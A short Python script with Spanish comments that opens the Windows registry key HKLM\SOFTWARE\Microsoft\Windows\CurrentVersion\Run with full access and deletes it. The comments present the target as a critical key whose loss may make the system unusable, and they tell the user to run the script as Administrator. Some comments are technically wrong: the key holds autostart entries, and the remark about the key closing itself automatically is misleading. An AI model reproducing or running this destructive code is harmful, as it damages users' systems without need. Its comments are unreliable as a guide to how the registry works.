import winreg
# Importamos el módulo para acceder al Registro de Windows.

# Definimos la ubicación del 'Registro' a borrar
# HKEY_LOCAL_MACHINE es una de las raíces principales.
ROOT_KEY = winreg.HKEY_LOCAL_MACHINE 

# CLAVE_A_BORRAR_CRITICA
# Por ejemplo, una clave donde Windows guarda configuraciones
# VITALES para su funcionamiento.
CLAVE_A_BORRAR_CRITICA = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 

# Nota: ELIMINAR CUALQUIER CLAVE DE ESTE NIVEL PUEDE INUTILIZAR
# EL SISTEMA OPERATIVO Y REQUERIR REINSTALACIÓN COMPLETA.

try:
    # Se abre la clave con permisos de ELIMINACIÓN
    clave_a_eliminar = winreg.OpenKey(
        ROOT_KEY, 
        CLAVE_A_BORRAR_CRITICA, 
        0, 
        winreg.KEY_ALL_ACCESS
    )
    
    # Se elimina la clave
    winreg.DeleteKey(clave_a_eliminar, "") # Se usa una cadena vacía para borrar la clave que acabamos de abrir
    print(f"La clave de registro {CLAVE_A_BORRAR_CRITICA} ha sido borrada.")

except FileNotFoundError:
    print("La clave especificada ya no existe, o no se encontró.")
except PermissionError:
    # Necesitas elevar el proceso a administrador para que funcione.
    print("Permiso denegado. Necesitas ejecutar el script como Administrador.")
except Exception as e:
    print(f"Ocurrió un error catastrófico: {e}")

# winreg.CloseKey(clave_a_eliminar) # winreg.OpenKey devuelve un objeto de contexto que se cierra automáticamente, pero es buena práctica.
